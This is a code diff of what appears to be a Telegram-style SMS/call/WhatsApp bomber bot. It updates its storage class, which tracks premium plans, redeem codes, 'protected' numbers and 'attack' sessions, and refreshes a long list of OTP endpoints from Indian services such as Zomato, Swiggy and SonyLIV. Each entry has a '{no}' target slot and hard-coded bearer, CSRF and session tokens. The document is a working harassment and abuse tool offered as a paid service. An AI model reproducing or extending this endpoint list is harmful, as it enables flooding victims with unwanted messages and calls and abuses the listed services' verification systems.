@@ -15,7 +15,7 @@ from datetime import datetime, timedelta
 
 # ========== SQLITE / AIOSQLITE IMPORTS ==========
 import aiosqlite
-import sqlite3  # for row factory helpers / sync checks
+import sqlite3
 
 # ========== LOGGING SETUP ==========
 logging.basicConfig(
@@ -149,23 +149,15 @@ PLANS = {
 
 # ========== SQLITE STORAGE CLASS ==========
 class SqliteStorage:
-    """
-    Drop-in replacement for the old MongoStorage.
-    Same method names / async signature - the rest of the bot is untouched.
-    Uses aiosqlite so the async event loop is never blocked (unlike raw sqlite3).
-    """
-
     def __init__(self, db_path):
         self.db_path = db_path
         self._conn = None
         self.temp_attack_data = {}
-        # ensure parent dir exists
         d = os.path.dirname(os.path.abspath(db_path))
         if d and not os.path.exists(d):
             os.makedirs(d, exist_ok=True)
         logger.info(f"✅ SQLite storage initialized: {db_path}")
 
-    # ---------- low-level helpers ----------
     async def _connect(self):
         if self._conn is None:
             self._conn = await aiosqlite.connect(self.db_path)
@@ -192,7 +184,6 @@ class SqliteStorage:
         await cur.close()
         return rows
 
-    # ---------- schema ----------
     async def ensure_indexes(self):
         conn = await self._connect()
         await conn.execute(
@@ -219,7 +210,6 @@ class SqliteStorage:
         await conn.commit()
         logger.info("✅ SQLite tables created!")
 
-    # ---------- users ----------
     async def get_user(self, user_id):
         row = await self._fetchone("SELECT * FROM users WHERE user_id = ?", (int(user_id),))
         if row is None:
@@ -236,7 +226,7 @@ class SqliteStorage:
                 )
                 logger.info(f"✅ New user added: {user_id}")
             except Exception:
-                pass  # race / already exists
+                pass
         return True
 
     async def is_premium(self, user_id):
@@ -325,7 +315,6 @@ class SqliteStorage:
         )
         return str_exp
 
-    # ---------- redeem codes ----------
     async def generate_code(self, days, plan_type="standard"):
         code = "PREMIUM-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
         existing = await self._fetchone("SELECT code FROM redeem_codes WHERE code = ?", (code,))
@@ -349,7 +338,6 @@ class SqliteStorage:
         exp_date = await self.add_premium(user_id, days, plan_type)
         return True, days, plan_type, exp_date
 
-    # ---------- protection ----------
     async def protect(self, user_id, number):
         await self._exec("UPDATE users SET protected_number = ? WHERE user_id = ?", (number, int(user_id)))
 
@@ -360,9 +348,7 @@ class SqliteStorage:
         row = await self._fetchone("SELECT user_id FROM users WHERE protected_number = ?", (number,))
         return row is not None
 
-    # ---------- force channel join ----------
     async def set_channel(self, channel_id):
-        """Store the channel id/username that users must join."""
         await self._exec(
             "INSERT INTO settings (key, value) VALUES ('channel_id', ?)"
             " ON CONFLICT(key) DO UPDATE SET value = excluded.value",
@@ -370,17 +356,14 @@ class SqliteStorage:
         )
 
     async def get_channel(self):
-        """Return stored channel id/username or None."""
         row = await self._fetchone("SELECT value FROM settings WHERE key = 'channel_id'")
         if row and row["value"]:
             return str(row["value"])
         return None
 
     async def remove_channel(self):
-        """Clear the forced channel setting."""
         await self._exec("DELETE FROM settings WHERE key = 'channel_id'")
 
-    # ---------- admin ----------
     async def get_all_users(self):
         rows = await self._fetchall("SELECT user_id FROM users")
         return [r["user_id"] for r in rows]
@@ -392,7 +375,6 @@ class SqliteStorage:
         total_codes = (await self._fetchone("SELECT COUNT(*) AS c FROM redeem_codes"))["c"]
         return total_users, premium_users, total_codes
 
-    # ---------- in-memory (attack session) ----------
     def set_attack_data(self, user_id, targets):
         self.temp_attack_data[user_id] = {'targets': targets, 'timestamp': time.time()}
 
@@ -412,15 +394,16 @@ class SqliteStorage:
         if self._conn is not None:
             await self._conn.close()
             self._conn = None
-# ========== INITIALIZE DB (will be properly set in main) ==========
+
 db = None
 
-# ========== ALL WORKING SMS/CALL/WHATSAPP APIS ==========
-
+# ========== COMPLETE API LIST (92+ APIs) ==========
 def build_api_list():
     apis = []
     
-    # ========== 1. NoBroker - SMS ==========
+    # ========== ORIGINAL APIS (1-80) ==========
+    
+    # 1. NoBroker - SMS
     apis.append({
         "name": "NoBroker_SMS",
         "url": "https://www.nobroker.in/api/v3/account/otp/send",
@@ -435,7 +418,7 @@ def build_api_list():
         "body": {"phone": "{no}", "countryCode": "IN"}
     })
     
-    # ========== 2. Housing.com - WhatsApp ==========
+    # 2. Housing - WhatsApp
     apis.append({
         "name": "Housing_WhatsApp",
         "url": "https://mightyzeus-mum.housing.com/api/gql",
@@ -450,7 +433,7 @@ def build_api_list():
         "body": {"query": "mutation($phone: String, $userAgent: String, $otpLength: Int, $preference: String) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength, preference: $preference) { success message } }", "variables": {"phone": "{no}", "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "otpLength": 4, "preference": "whatsapp"}}
     })
     
-    # ========== 3. Housing.com - SMS ==========
+    # 3. Housing - SMS
     apis.append({
         "name": "Housing_SMS",
         "url": "https://mightyzeus-mum.housing.com/api/gql",
@@ -465,7 +448,7 @@ def build_api_list():
         "body": {"query": "mutation($phone: String, $userAgent: String, $otpLength: Int) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength) { success message } }", "variables": {"phone": "{no}", "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "otpLength": 4}}
     })
     
-    # ========== 4. Zomato - SMS ==========
+    # 4. Zomato - SMS
     apis.append({
         "name": "Zomato_SMS",
         "url": "https://accounts.zomato.com/login/phone",
@@ -479,7 +462,7 @@ def build_api_list():
         "body": {"number": "{no}", "country_id": "1", "lc": "bed7238d427f41e7a34ea6ea134d2628", "type": "initiate", "verification_type": "sms", "package_name": "com.application.zomato", "message_uuid": ""}
     })
     
-    # ========== 5. Zomato - Call ==========
+    # 5. Zomato - Call
     apis.append({
         "name": "Zomato_Call",
         "url": "https://accounts.zomato.com/login/phone",
@@ -493,7 +476,7 @@ def build_api_list():
         "body": {"number": "{no}", "country_id": "1", "lc": "bed7238d427f41e7a34ea6ea134d2628", "type": "initiate", "verification_type": "call", "package_name": "", "message_uuid": "sms-service-v2-12cf2bdc-7cd9-4e1a-9cd1-6470f83d56f0"}
     })
     
-    # ========== 6. Zomato - WhatsApp ==========
+    # 6. Zomato - WhatsApp
     apis.append({
         "name": "Zomato_WhatsApp",
         "url": "https://accounts.zomato.com/login/phone",
@@ -507,10 +490,10 @@ def build_api_list():
         "body": {"number": "{no}", "country_id": "1", "lc": "af07c17656e641efbfcc489f51aea946", "type": "initiate", "verification_type": "whatsapp", "package_name": "", "message_uuid": ""}
     })
     
-    # ========== 7. Refyne - SMS ==========
+    # 7. Refyne - SMS
     apis.append({
         "name": "Refyne_SMS",
-        "url": "https://prod-api.refyne.co.in/auth/v2/send-otp",
+        "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
         "method": "POST",
         "headers": {
             "Host": "prod-api.refyne.co.in",
@@ -521,10 +504,10 @@ def build_api_list():
         "body": {"channel": "SMS", "recipient": "{no}"}
     })
     
-    # ========== 8. Refyne - Call ==========
+    # 8. Refyne - Call
     apis.append({
         "name": "Refyne_Call",
-        "url": "https://prod-api.refyne.co.in/auth/v2/send-otp",
+        "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
         "method": "POST",
         "headers": {
             "Host": "prod-api.refyne.co.in",
@@ -535,10 +518,10 @@ def build_api_list():
         "body": {"channel": "IVR", "recipient": "{no}"}
     })
     
-    # ========== 9. Refyne - WhatsApp ==========
+    # 9. Refyne - WhatsApp
     apis.append({
         "name": "Refyne_WhatsApp",
-        "url": "https://prod-api.refyne.co.in/auth/v2/send-otp",
+        "url": "https://prod-api.refyne.co.in/auth/v3/send-otp",
         "method": "POST",
         "headers": {
             "Host": "prod-api.refyne.co.in",
@@ -549,7 +532,7 @@ def build_api_list():
         "body": {"channel": "WHATSAPP", "recipient": "{no}"}
     })
     
-    # ========== 10. Rapido ==========
+    # 10. Rapido
     apis.append({
         "name": "Rapido_GenerateOTP",
         "url": "https://customer.rapido.bike/api/customer/v2/generateOtp",
@@ -564,7 +547,7 @@ def build_api_list():
         "body": {"deviceDetails": {"androidId": "", "appId": "2", "deviceId": "13d0b5bd46e271ca", "firebaseToken": "cejGtzeATDCDAjgxrdjMpG", "manufacturer": "google", "model": "Pixel 4", "timeStamp": "0", "firebaseAppInstanceId": "8a36cb89a513fac0eaac67b9bb716f2f"}, "mobile": "{no}"}
     })
     
-    # ========== 11. Rapido - WhatsApp Resend ==========
+    # 11. Rapido - WhatsApp Resend
     apis.append({
         "name": "Rapido_WhatsApp_Resend",
         "url": "https://customer.rapido.bike/api/customer/whatsApp/v2/resendOtp",
@@ -579,7 +562,7 @@ def build_api_list():
         "body": {"mobile": "{no}"}
     })
     
-    # ========== 12. EazyDiner - SMS ==========
+    # 12. EazyDiner - SMS
     apis.append({
         "name": "EazyDiner_SMS",
         "url": "https://force.eazydiner.com/4.1/otp?medium=android",
@@ -597,7 +580,7 @@ def build_api_list():
         "body": {"mobile": "+{no}"}
     })
     
-    # ========== 13. EazyDiner - WhatsApp ==========
+    # 13. EazyDiner - WhatsApp
     apis.append({
         "name": "EazyDiner_WhatsApp",
         "url": "https://force.eazydiner.com/4.1/otp?medium=android",
@@ -615,7 +598,7 @@ def build_api_list():
         "body": {"mobile": "+{no}", "whatsapp": "1"}
     })
     
-    # ========== 14. GoMechanic ==========
+    # 14. GoMechanic
     apis.append({
         "name": "GoMechanic",
         "url": "https://gomechanic.app/api/v2/send_otp",
@@ -637,7 +620,7 @@ def build_api_list():
         "body": {"hash": "cfN9tRcI8/y", "number": "{no}", "random_id": "5f2ue", "token": "c8b9b119701c5668829cd6acc8aa053bcf1003f6642a55f0a39a80db905f24d1"}
     })
     
-    # ========== 15. IndustryBuying ==========
+    # 15. IndustryBuying
     apis.append({
         "name": "IndustryBuying",
         "url": "https://api.industrybuying.com/api/users/action",
@@ -657,7 +640,7 @@ def build_api_list():
         "body": {"pageUri": "/user/register?loginId=", "moduleType": "USERS", "requestType": "ACTION", "pageType": "USER", "userContext": {"action": "VERIFY_USER", "payload": {"loginId": "{no}", "isLoginModule": False, "businessIdentificationVerified": False, "emailId": "temp@gmail.com", "fullName": "temp", "ibCredit": True, "mobileNo": "{no}", "mobileNoVerified": False}, "url": None}, "shouldHardReload": True}
     })
     
-    # ========== 16. Badho Initiate ==========
+    # 16. Badho Initiate
     apis.append({
         "name": "Badho_Initiate",
         "url": "https://auth.badho.in/api/authentication/initiate",
@@ -671,7 +654,7 @@ def build_api_list():
         "body": {"env": "production", "platform": "android", "phoneNumber": "{no}", "appName": "buyer", "token": "0cAFcWeA797B78eeflCRX-9LAycLJYX3SrlpHdLT3KmxtpyM5QaQNY2DcuPKuENYDro7TzO1ulAh6JrUpGKhWAYAWdafRAA_LNvc1LCi9zOk3m7Ft1ERO0m06v0amVG6--Aw1cqF6LHyhSIvru_jtJA8l-U2GnqSgOIDcdhryhDMZNhEyq-bY1Dur1hc7hR64p1NWHemiemLju2-tBj673DvYXfgGQNSJkdIb7yglQO1TewFGvWYwBUW-FWuqXGtKsreBk8ZA7Vn2ryGpUHBde5cuR5I6nM8SWoP1yDZFnRIqcI_6laCzH0sUD0Jdmhy-pkrvT9tn57KPX-q9CHzFDXJMbNmij8fngN9uYAgEkcBPXde-AO_w7PLWQrSTmKJkjM_69vot9AgFqnhmWVkKg1oMH42an6fP9W_vtYvOtJfNFULiH1Ptr98SftdZJMeRLlwySOwkHmXb0ctKcn696c7RBrDrktnQoxf15aYRZ9ncI-s-rNCU3HoMMdlTsIntvfJMZR7MKsAjI7JSM0yCkNwGgScmrA6Z9NRuO5SqVm_o-xndu-kp_K_iufLC1UVxlPvVNTHrfjmsBtviPQ7IxqDx-KSihdpiEAa6Fw31aWZfHrtkagsTf7SKeTBRhUXRoSWJHUJS9Q-NG0ksy76o6fxN2oKqp3Xd-SXFyB_fhbAgUkGjJau67rl_iWR6amlBY6wdTdMZxjLRYvTpLgs2y4r1uHfhu0-05aveYyE_5VOu7mWIu2FeWX3x0vA3X1801NgA-jKEVtlSiHGoFRut6Pytl8vkVi8LdIyeURu2_y8HM0pPTWzOH0MnFlkb8sqXhC5-3FHtBfsg7qK7f-6G8ZOPVOCgupc_XBnZyrKhv9vVRswE7QjvS3qUfmC6lzhHiWr1lOadk_8NDES62GsYXYkHPZiTKvB4iqeEPXIPzVfkIIlTe6EVz2Q9dnhZu7FVjNbFFIUiP9AH80uoQZ_F8A9Tbka3RweabgNBpt2ZMgzi4kSY2HN_iKf2MXy5ss3BQiYtPIPhQyzStvRZdYoKmViLJir_mkRDbGXSD2JEuL1j0fpyHlJ6Uenhdv5rTDb5xkZyLJ0ZLxK_4dWXmoAN2wSeCcn1hSTcDv1xwOIW0LCgag6NiwG85g7_ckr1bUpZZ_1RP8pcLj627tY3S0vy6nlTbkdBUAxbrl2Z2Eb6rBHNN0metAujE5R0306iyZvCifccyqrSjAaDe6K_-DJkfWtKAA9RUZq-vc0LX8kihlFo9OjzO4-RyCx6cq1U1R6RqjEc8Wf-NUco9DCN41u2XhYDLmo6C5V3p0Dr2haPg8sbafQ2Owh1I7BiG-euwd4QRetkxryerZPVxBu-TRHOdprTZV7ILyDufBMjfFMRuGku_-HQDth3qwr_DUWE_qFR_oZofN3SVpzQXx3vddZCFoOvTPsUP4TfrsbDty5a2a0zL1Kkbq5GM7R2lwoLLAKhdV6CHUI0D2z4bMudAR-dkWg_oqB2kd3gj0qX9yH1aHhum1OWnrv4a48N3pVBw9gtgw4zCVcC_fb6bi0xYalzWzSZoHuLFQczujn2g20k_YghKma2pnG4lnyo71aICoAIvsx56Ygic0kU8XFamCjzIc7t2huOWHrGO1G0jI2NoCRSQDbrfUef-AWafr-Fk0K4msQNPjm4y9yNe1bkNydxVMRZvFgh2h5G1kh0_omx45NfA6Ix8Yjtq5DqRP9kxbKss4AhoLPL1cW1ChuPgGG3LaAjqxFqEN5eO8-gc3UVr8nX0anoxszXXrTfPsZnCxe0FkEvVhhHjjm--xA0scnB1Vv1QuhVGtT2qEWJw67LoaIR7xMyAFFOILv0m2k7dk2pYLIak4Nb2F2AmpmS_aEcapPYM_-ZfeZAUXJiJImd53bQb8nOzYpLLHLNJliV_hYoJLHllmy0SyGw4H4yWVIBmLcP_ECkn3eTr2O7RIoRlxfRJ7LRWCd7MmmyQZTUeFDuVfQhOUlkbhscZ3Z6l6Yj9gCX4IcF2SukN_PAkogFOKKS9hyERIHq9JmfP5ohIV_AnKt8gKqd2LZ6Huqiz7WZJbgxil_kyCu6wY29ygTXCk4bOWn-iFEbVYJ86czmhmLimBpFZOwtj1ZnixaODD0CbpIkbilcpGSldyE2m6iqUttXOOOjvkCh8dxyLsOt9-IJG2sO-eFno8Ue7d_aSNVhSjzahCl82_1O8EbQ6wNSP1c7dKdSkLguPGf_I0Lm7YOg_tQMbyRNNLz15KsPpKnyiKlQ1dp3T5DYZ34auLsvwtQBhvyKQclevsp19xxX-Cn162Gj8UWGU2YkAuvEoBivSJrclhBxIqhgeTkZQXhvT2FHfGb4QWpzlneKNsAj7muOcqs3byLS9zM61tUq8cFv1tBXjhE4hOmVCW7ie9Z1nRhYuCx8kOrlAXoOQm5D-oPKQNw865cckmzOBeOqpVaZQ_BtSZS10PTcbkzqmwxJhLSeTxMeIoT5eH4dxHe8DdTJSesNUH3R6i_M2nWiAH0C0msphiKTgcx0kumN7u3vJmoiwpVs-OubRV2w-HJ4G10utRGLwu34kmFavxgPolGFid0hUF1KHY8hVGL0pBGwX7mOpTpt65s6Z3AU", "appId": "2391550b-7f93-4b02-8043-60a8646ec4f4", "contextToken": None, "otpHashCode": "vkfCtgDqUPU"}
     })
     
-    # ========== 17. Badho Call ==========
+    # 17. Badho Call
     apis.append({
         "name": "Badho_Call",
         "url": "https://auth.badho.in/api/authentication/send-otp-via-phone-call",
@@ -685,7 +668,7 @@ def build_api_list():
         "body": {"contextToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJPVFBFbnRyeUlkIjoiM2I2NWJjNjgtMWYwOC00M2E2LWJlMGUtMDE3Mjk4NDk0YzNkIiwiaWF0IjoxNzU3NjY2OTMwLCJleHAiOjE3NjAyNTg5MzB9.0IWP-jXL-msPIuVlKoCd7U1dyMEEZDMPidaZMDzl9VY", "phoneNumber": "{no}", "appName": "buyer"}
     })
     
-    # ========== 18. Urbanic - SMS ==========
+    # 18. Urbanic - SMS
     apis.append({
         "name": "Urbanic_SMS",
         "url": "https://api-shop-in.urbanic.com/n/api/buyer/basic/otp/sendCode",
@@ -703,7 +686,7 @@ def build_api_list():
         "body": {"bizTraceId": "be35ec943fee4d58a32727b2adfe9f9f", "channel": 1, "phonePrefix": "+91", "type": 0, "userName": "{no}"}
     })
     
-    # ========== 19. Urbanic - WhatsApp ==========
+    # 19. Urbanic - WhatsApp
     apis.append({
         "name": "Urbanic_WhatsApp",
         "url": "https://api-shop-in.urbanic.com/n/api/buyer/basic/otp/sendCode",
@@ -721,7 +704,7 @@ def build_api_list():
         "body": {"bizTraceId": "be35ec943fee4d58a32727b2adfe9f9f", "channel": 2, "phonePrefix": "+91", "type": 0, "userName": "{no}"}
     })
     
-    # ========== 20. Spinny ==========
+    # 20. Spinny
     apis.append({
         "name": "Spinny",
         "url": "https://api.spinny.com/api/c/user/otp-request/",
@@ -736,13 +719,13 @@ def build_api_list():
         "body": {"contact_number": "{no}", "whatsapp": False, "code_len": 4}
     })
     
-    # ========== 21. AstroYogi - Generate OTP ==========
+    # 21. AstroYogi - Generate OTP
     apis.append({
         "name": "AstroYogi_GenerateOtp",
         "url": "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
         "method": "POST",
         "headers": {
-            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9",
+            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.",
             "Accept-Language": "en-US",
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
@@ -751,13 +734,13 @@ def build_api_list():
         "body": {"PhoneNumber": "{no}", "PhoneCode": "91", "Domain": "Web", "CountryId": "IN", "IpAddress": "117.234.73.154", "CountryCodeByHeader": "IN"}
     })
     
-    # ========== 22. AstroYogi - Call ==========
+    # 22. AstroYogi - Call
     apis.append({
         "name": "AstroYogi_Call",
         "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp",
         "method": "POST",
         "headers": {
-            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9",
+            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.",
             "Accept-Language": "en-US",
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
@@ -766,13 +749,13 @@ def build_api_list():
         "body": {"phoneCode": "91", "countryCode": "IN", "mobileNumber": "{no}", "platform": "Web", "IpAddress": "117.234.73.154", "requestType": "call", "countryCodeByHeader": "IN"}
     })
     
-    # ========== 23. AstroYogi - WhatsApp ==========
+    # 23. AstroYogi - WhatsApp
     apis.append({
         "name": "AstroYogi_WhatsApp",
         "url": "https://comm.astroyogi.com/api/OtpComm/SendOtp",
         "method": "POST",
         "headers": {
-            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9",
+            "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.",
             "Accept-Language": "en-US",
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
@@ -781,7 +764,7 @@ def build_api_list():
         "body": {"phoneCode": "91", "countryCode": "IN", "mobileNumber": "{no}", "platform": "Web", "IpAddress": "117.234.73.154", "requestType": "whatsapp", "countryCodeByHeader": "IN"}
     })
     
-    # ========== 24. AnytimeAstro ==========
+    # 24. AnytimeAstro
     apis.append({
         "name": "AnytimeAstro",
         "url": "https://www.anytimeastro.com/account/registermobile/",
@@ -795,7 +778,7 @@ def build_api_list():
         "body": {"ContactMobile": "{no}", "MobCode": "%2B91", "trackingUrl": "", "ReferralCode": "", "reCaptchaResponse": "", "AcceptHuman": "true", "CountryCode": "in", "ConfirmMobile": "", "AcceptHumanenabled": "1", "captchaenabled": "0", "__RequestVerificationToken": "Iyj_j-I3vZHWeCuJ9PdDFF1yZqK3j9vCBb9YtXcD44UkzDahjHKmOR226JJC-nkOT_fLQCQ0IwMoVSiHdMHhaxRineJJYZh1X_bXSzDMukk1"}
     })
     
-    # ========== 25. Milkbasket - Voice ==========
+    # 25. Milkbasket - Voice
     apis.append({
         "name": "Milkbasket_Voice",
         "url": "https://consumerbff.milkbasket.com/graphql",
@@ -817,7 +800,7 @@ def build_api_list():
         "body": {"operationName": "registerNumber", "variables": {"phone": "{no}", "retry": True, "retryType": "voice", "appHash": "", "udid": "QZg2sH1J6vHLMwDK"}, "query": "mutation registerNumber($phone: String!, $retry: Boolean!, $retryType: String!, $appHash: String!, $udid: String!) { registerPhoneNumber(phone: $phone retry: $retry retryType: $retryType appHash: $appHash udid: $udid) { status error errorMsg otpBlockTime __typename } }"}
     })
     
-    # ========== 26. Apollo247 ==========
+    # 26. Apollo247
     apis.append({
         "name": "Apollo247",
         "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
@@ -833,7 +816,7 @@ def build_api_list():
         "body": {"loginType": "PATIENT", "mobileNumber": "+{no}"}
     })
     
-    # ========== 27. BharatMatrimony ==========
+    # 27. BharatMatrimony
     apis.append({
         "name": "BharatMatrimony",
         "url": "https://greg.bharatmatrimony.com/",
@@ -849,7 +832,7 @@ def build_api_list():
         "body": {"operationName": "SendRegistrationOTP", "variables": {"input": {"motherTongue": "TAMIL", "registerId": 119702837, "registrationToken": "5a88de4e6473364a9d4f8dc32f5bb2af~IfJLlQLb3bw6Tr/PCXKXpyraj3wu8hJ7cDLLhUCkCQs=", "device": {}, "deviceToken": "WEB"}}, "query": "mutation SendRegistrationOTP($input: RegisterId) { sendRegistrationOTP(input: $input) { sessionValue status __typename } }"}
     })
     
-    # ========== 28. Jeevansathi ==========
+    # 28. Jeevansathi
     apis.append({
         "name": "Jeevansathi",
         "url": "https://www.jeevansathi.com/app-gateway/auth/v1/phone/otp",
@@ -865,7 +848,7 @@ def build_api_list():
         "body": {"userId": "{no}", "isd": "91", "otpType": "LOGIN_PROFILE"}
     })
     
-    # ========== 29. Yatra ==========
+    # 29. Yatra
     apis.append({
         "name": "Yatra",
         "url": "https://www.yatra.com/social/common/yatra/sendMobileOTP",
@@ -878,7 +861,7 @@ def build_api_list():
         "body": {"isdCode": "91", "mobileNumber": "{no}"}
     })
     
-    # ========== 30. Cleartrip ==========
+    # 30. Cleartrip
     apis.append({
         "name": "Cleartrip",
         "url": "https://www.cleartrip.com/accounts/external-api/otp",
@@ -902,7 +885,7 @@ def build_api_list():
         "body": {"value": "{no}", "type": "MOBILE", "action": "SIGNIN", "countryCode": "+91"}
     })
     
-    # ========== 31. Swiggy ==========
+    # 31. Swiggy
     apis.append({
         "name": "Swiggy",
         "url": "https://www.swiggy.com/mapi/auth/sms-otp",
@@ -917,20 +900,20 @@ def build_api_list():
         "body": {"mobile": "{no}", "_csrf": "3eux3tggHIFM-af_1Dssqu1f6xuveWY1yqrm0ggI"}
     })
     
-    # ========== 32. Snitch ==========
+    # 32. Snitch
     apis.append({
         "name": "Snitch",
         "url": "https://www.snitch.com/api/auth/send-otp",
         "method": "POST",
         "headers": {
             "Content-Type": "application/json",
-            "X-CAP-Token": "70d6a713cb6835d1:de600bf5089c2a2ddcbcb26518ad30",
+            "X-CAP-Token": "81986cb3c6d6b7fd:021b93a18b7d0edf5b5f80b296ca0f",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
         "body": {"mobile_number": "+{no}"}
     })
     
-    # ========== 33. Snitch - Voice Resend ==========
+    # 33. Snitch - Voice Resend
     apis.append({
         "name": "Snitch_Voice",
         "url": "https://www.snitch.com/api/auth/resend-otp",
@@ -938,13 +921,13 @@ def build_api_list():
         "params": {"mode": "voice"},
         "headers": {
             "Content-Type": "application/json",
-            "X-CAP-Token": "015a4adb4fcebceb:dcd8d06bbd9311f025af80eaeeb8e0",
+            "X-CAP-Token": "1d059f0c33c4d34b:868c9d763b60c83616551acdd002e6",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
         "body": {"mobile_number": "+{no}"}
     })
     
-    # ========== 34. SonyLIV - SMS ==========
+    # 34. SonyLIV - SMS
     apis.append({
         "name": "SonyLIV_SMS",
         "url": "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2",
@@ -952,16 +935,16 @@ def build_api_list():
         "headers": {
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
-            "app_version": "3.8.3",
+            "app_version": "3.8.5",
             "device_id": "3497a83d061e4b96b2dad39177ac29e7-1776169088769",
             "Access-Control-Allow-Origin": "*",
-            "session_id": "cfccce5515484b68989cbafea5bcc184-1781158627983",
+            "session_id": "2288862e9e344eca95e146997b2ef64a-1786124508031",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
-        "body": {"mobileNumber": "{no}", "smsType": "SMS", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2026-06-11T06:17:22.989Z", "otpSize": 4, "isMobileMandatory": True, "loginType": "REGISTERORSIGNIN"}
+        "body": {"mobileNumber": "{no}", "smsType": "SMS", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2026-08-07T17:42:34.848Z", "otpSize": 4, "isMobileMandatory": True, "loginType": "REGISTERORSIGNIN"}
     })
     
-    # ========== 35. SonyLIV - Voice ==========
+    # 35. SonyLIV - Voice
     apis.append({
         "name": "SonyLIV_Voice",
         "url": "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2",
@@ -969,16 +952,16 @@ def build_api_list():
         "headers": {
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
-            "app_version": "3.8.3",
+            "app_version": "3.8.5",
             "device_id": "3497a83d061e4b96b2dad39177ac29e7-1776169088769",
             "Access-Control-Allow-Origin": "*",
-            "session_id": "cfccce5515484b68989cbafea5bcc184-1781158627983",
+            "session_id": "2288862e9e344eca95e146997b2ef64a-1786124508031",
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
-        "body": {"mobileNumber": "{no}", "smsType": "Voice", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2026-06-11T06:19:20.801Z", "otpSize": 4, "isMobileMandatory": True, "loginType": "REGISTERORSIGNIN"}
+        "body": {"mobileNumber": "{no}", "smsType": "Voice", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2026-08-07T17:44:15.343Z", "otpSize": 4, "isMobileMandatory": True, "loginType": "REGISTERORSIGNIN"}
     })
     
-    # ========== 36. ManMatters ==========
+    # 36. ManMatters
     apis.append({
         "name": "ManMatters",
         "url": "https://api.manmatters.com/portal/auth/send-otp",
@@ -993,7 +976,7 @@ def build_api_list():
         "body": {"phoneNumber": "{no}", "source": "", "resend": False}
     })
     
-    # ========== 37. IGP ==========
+    # 37. IGP
     apis.append({
         "name": "IGP",
         "url": "https://www.igp.com/v2/loginSignup",
@@ -1007,7 +990,7 @@ def build_api_list():
         "body": {"email": "", "mprefix": "91", "mob": "{no}", "cid": "99", "claimNumber": False, "newUserFlag": False, "verifyOtp": False, "otp": "", "isGuest": False, "isInternational": False}
     })
     
-    # ========== 38. Kredmint ==========
+    # 38. Kredmint
     apis.append({
         "name": "Kredmint",
         "url": "https://merchant-v2.kredmint.in/api/auth/login/",
@@ -1021,7 +1004,7 @@ def build_api_list():
